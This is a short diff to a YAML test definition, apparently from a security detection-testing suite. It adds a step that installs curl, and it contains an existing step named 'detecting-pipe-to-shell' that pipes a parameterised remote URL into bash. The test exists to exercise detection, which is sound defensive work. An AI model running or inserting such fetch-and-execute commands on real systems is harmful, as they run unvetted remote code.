@@ -18,6 +18,12 @@ requirements:
     platforms:
         - os: linux
 steps:
+    - name: |
+        Check if curl is installed on the machine.
+      inline: |
+        if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; {which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+        }; fi
+      executor: bash
     - name: detecting-pipe-to-shell
       inline: "cd /tmp\ncurl -s {{.Args.remote_url}} |bash\nls -la /tmp/art.txt      \n"
       executor: sh
